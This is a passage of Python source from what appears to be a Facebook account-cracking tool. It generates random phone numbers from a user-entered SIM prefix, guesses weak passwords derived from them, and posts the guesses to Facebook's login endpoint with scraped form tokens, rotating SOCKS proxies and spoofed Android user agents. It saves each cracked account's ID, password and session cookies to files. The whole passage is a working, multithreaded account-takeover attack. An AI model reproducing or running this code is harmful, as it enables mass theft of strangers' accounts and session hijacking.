			log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), 'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), ps), 'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__a': '',  '__user': '0'}
			header_freefb = {'authority': 'm.facebook.com',
'sec-ch-ua-full-version-list': '"Google Chrome";v="129.0.6668.100", "Not=A?Brand";v="8.0.0.0", "Chromium";v="129.0.6668.100"',
'sec-ch-ua-platform': '"Android"',
'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
'sec-ch-ua-model': '"23090RA98I"',
'x-response-format': 'JSONStream',
'sec-ch-ua-mobile': '?1',
'x-asbd-id': '129477',
'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
'x-requested-with': 'XMLHttpRequest',
'sec-ch-prefers-color-scheme': 'dark',
'user-agent': moz,
'content-type': 'application/x-www-form-urlencoded',
'sec-ch-ua-platform-version': '"14.0.0"',
'accept': '*/*',
'origin': 'https://m.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1514268612498066&kid_directed_site=0&app_id=1514268612498066&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1514268612498066%26cbt%3D1729229219250%26e2e%3D%257B%2522init%2522%253A1729229219250%257D%26ies%3D0%26sdk%3Dandroid-17.0.2%26sso%3Dchrome_custom_tab%26nonce%3D029e43d1-44e5-4f14-98a4-8a6d5dc9445e%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25220d92adbe-5681-4c66-8628-04a9efa91455%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%252287r3omfmts9fme6q4fa3%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb1514268612498066%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DQKvjIvEo-oLz6uAZ-BCmZJy0P2V_gSBBWyovZ5TsrU8%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0d92adbe-5681-4c66-8628-04a9efa91455%26tp%3Dunspecified&cancel_url=fb1514268612498066%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25220d92adbe-5681-4c66-8628-04a9efa91455%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%252287r3omfmts9fme6q4fa3%2522%257D%23_%3D_&display=touch&locale=en_IN&pl_dbl=0&refsrc=deprecated&_rdr',
'accept-encoding': 'gzip, deflate, br, zstd',
'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,bn;q=0.5',
'priority': 'u=1, i',}
			lo = session.post('https://m.facebook.com/login/device-based/login/async/?api_key=1514268612498066&auth_token=0d0b063184be1d4f03648a30dafa32d7&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1514268612498066%26cbt%3D1729229219250%26e2e%3D%257B%2522init%2522%253A1729229219250%257D%26ies%3D0%26sdk%3Dandroid-17.0.2%26sso%3Dchrome_custom_tab%26nonce%3D029e43d1-44e5-4f14-98a4-8a6d5dc9445e%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25220d92adbe-5681-4c66-8628-04a9efa91455%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%252287r3omfmts9fme6q4fa3%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb1514268612498066%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DQKvjIvEo-oLz6uAZ-BCmZJy0P2V_gSBBWyovZ5TsrU8%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0d92adbe-5681-4c66-8628-04a9efa91455%26tp%3Dunspecified&refsrc=deprecated&app_id=1514268612498066&cancel=fb1514268612498066%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25220d92adbe-5681-4c66-8628-04a9efa91455%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%252287r3omfmts9fme6q4fa3%2522%257D%23_%3D_&lwv=100',data=log_data,headers=header_freefb,proxies=proxs).text
			log_cookies=session.cookies.get_dict().keys()
			print(log_data)
			#print(header_freefb)
			#print(lo)
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cooki = f"sb={ssbb};{coki}"
				user = re.findall('c_user=(.*);xs', cooki)[0]
				ur = user[:4]
				if '6156' in ur:
					#cek_apk(session,coki)
					oks.append(user) 
					print('\033[1;92m [\033[1;92mBALER-ID\033[1;92m] '+user+' | '+ps)
					print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+cooki)
					#cek_apkk(session,coki)
					open('/sdcard/JARV1S/jrvis-m2-6155.txt', 'a').write(user+'|'+ps+'|'+cooki+'\n')
					break
				else:
					#cek_apk(session,coki)
					oks.append(user) 
					print('\033[1;92m [JARVIS-OK] '+user+' | '+ps)
					print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+cooki)
					cek_apkk(session,coki)
					open('/sdcard/JARV1S/jrvis-m2-cookies.txt', 'a').write(user+'|'+ps+'|'+cooki+'\n')
					break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				user = re.findall('c_user=(.*);xs', coki)[0]
				print('\033[1;92m [JARVIS-CP] '+cid+' | '+ps)
				open('/sdcard/ARYAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
				cps.append(cid)
				break	
			else:
				continue
		loop+=1
		#sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM-2\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
		#sys.stdout.flush()
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass

def method3():
	user=[]
	os.system('clear');print(logo)
	print(f'{Y}[{W}•{Y}] {W}Type Any 4digit Sim Code (exp- 8101,8927)')
	print(47*"—") 
	kode = input(f'{Y}[{W}?{Y}] {W}Input Code : ')
	print(47*"—") 
	limit = int(input(f'{Y}[{W}?{Y}] {W}How Many Numbers Do You Want To Add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\x1b[1;97m[\x1b[1;91m✓\x1b[1;97m]\x1b[1;97m Total Idz: '+tl+' \x1b[1;97m>\x1b[1;91m>\x1b[1;97m>\x1b[1;97m Choice Code: '+kode)
		print(47*"\x1b[1;97m—") 
		for guru in user:
			uid = kode+guru
			mk = uid[:6]
			xx = uid[:7]
			v = uid[:8]
			b = guru[:6]
			pwx = [mk,kode+guru,b,'57273200',v]
			yaari.submit(bbcrack,uid,pwx,tl)
	print(47*"—") 
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	print(47*"—") 
	input('Press Enter To Go Back To Menu')
	method()
	
def bbcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global lcs
	global jrvis
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM-3\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
			sys.stdout.flush()
			nip=random.choice(proxs)
			proxs= {'http': 'socks4://'+nip}
			moz = random.choice(uge)
			app = '783771893570503'
			token = '9779b0937304f234fc0f7d46a0c08e49'
			facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
			bv = f"{random.randint(1111111,7777777)}"
			versi_android = f"{random.randint(4,13)}"
			device = random.choice(['M910x','D10i','2PXH3','D830x','U-2u','M910x','2PXH3'])
			#device = random.choice(['V2183A','I2223','V2307','V2314','I2217','V2239'])
			#device = random.choice(['SM-A515F','SM-A235F','SM-A525F','SM-A715F','SM-G996B','SM-A705F','SM-A315F'])
			us = f"[FBAN/Orca-Android;FBAV/"+facebook_version+";FBPN/com.facebook.orca;FBLC/en_IN;FBBV/"+bv+";FBCR/Jio;FBMF/HTC;FBBD/HTC;FBDV/"+device+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=1920};FB_FW/1"
			ua= f"Dalvik/2.1.0 (Linux; U; Android "+versi_android+"; HTC 2Q6E1 Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/Orca-Android;FBAV/"+facebook_version+";FBPN/com.facebook.orca;FBLC/en_IN;FBBV/"+bv+";FBCR/Jio;FBMF/HTC;FBBD/HTC;FBDV/2Q6E1;FBSV/"+versi_android+";FBCA/armeabi-v8.2a:armeabi;FBDM/{density=2.0,width=1080,height=2160};FB_FW/1;] FBBK/1"
			free_fb = session.get('https://x.facebook.com/login.php?skip_api_login=1&api_key=324114629514418&kid_directed_site=0&app_id=324114629514418&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fclient_id%3D324114629514418%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fwww.jualo.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3Dc9d930b451825459766d94b810dccb22948437704c326b1c%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8abbdb7b-0094-4d1d-a943-fbdc26e535ec%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.jualo.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dc9d930b451825459766d94b810dccb22948437704c326b1c%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr').text
			log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), 'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'bi_wvdp': '', 'pass': ps, 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), '__dyn': '', '__csr': '', '__req': 'd', '__a': '', '__fmt': '1', '__user': '0'}
			lg_data = {
				'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
    'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
    'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
    'try_number': '0',
    'unrecognized_tries': '0',
    'email': uid,
    'pass': ps,
    'login': 'Log In'}
			header_freefb = {'authority': 'm.facebook.com',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    #'cookie': 'datr=G1b5ZerHgdntYLxRjgCXuL5u; sb=G1b5ZTWmCb1xEcweiJl4hEPD; ps_n=1; ps_l=1; dpr=3.2983407974243164; locale=en_GB; m_pixel_ratio=3; wd=407x798; fr=0iQNkSbBuU2aApgeW.AWXVsRYRQ5PATXgtju-wWL0oZ-A.Bl-c9M..AAA.0.0.Bm-pJQ.AWUBNSzeeQ8',
    'origin': 'https://m.facebook.com',
    'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=324114629514418&kid_directed_site=0&app_id=324114629514418&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fclient_id%3D324114629514418%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fwww.jualo.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3Dc9d930b451825459766d94b810dccb22948437704c326b1c%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8abbdb7b-0094-4d1d-a943-fbdc26e535ec%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.jualo.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dc9d930b451825459766d94b810dccb22948437704c326b1c%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': moz,
    'x-asbd-id': '129477',
    'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    'x-requested-with': 'XMLHttpRequest',
    'x-response-format': 'JSONStream',}
			lo = session.post('https://m.facebook.com/login/device-based/login/async/?api_key=324114629514418&auth_token=8ff4529318e9a0411b27956324ad4b9c&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fclient_id%3D324114629514418%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fwww.jualo.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3Dc9d930b451825459766d94b810dccb22948437704c326b1c%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8abbdb7b-0094-4d1d-a943-fbdc26e535ec%26tp%3Dunspecified&refsrc=deprecated&app_id=324114629514418&cancel=https%3A%2F%2Fwww.jualo.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dc9d930b451825459766d94b810dccb22948437704c326b1c%23_%3D_&lwv=100',data=log_data,headers=header_freefb,proxies=proxs,allow_redirects=False).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				#ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				#cooki = f"sb={ssbb};{coki}"
				user = re.findall('c_user=(.*);fr', coki)[0]
				cid = coki[165:180]
				ur = user[:4]
				if '6155' in ur:
					cek_apk(session,coki)
					oks.append(user) 
					print('\033[1;92m [\033[1;92mBALER-ID\033[1;92m] '+user+' | '+ps)
					print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+coki)
					#cek_apkk(session,coki)
					open('/sdcard/JARV1S/jrvis-m3-6155.txt', 'a').write(user+'|'+ps+'|'+coki+'\n')
					break
				else:
					cek_apk(session,coki)
					oks.append(user) 
					print('\033[1;92m [JARVIS-OK] '+user+' | '+ps)
					print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+coki)
					#cek_apkk(session,coki)
					open('/sdcard/JARV1S/jrvis-m3-cookies.txt', 'a').write(user+'|'+ps+'|'+coki+'\n')
					break	
			else:
				continue
		loop+=1
		#sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM-3\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
		#sys.stdout.flush()
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass

if __name__=='__main__':
	#os.system("git pull")
	#method()
	method1()
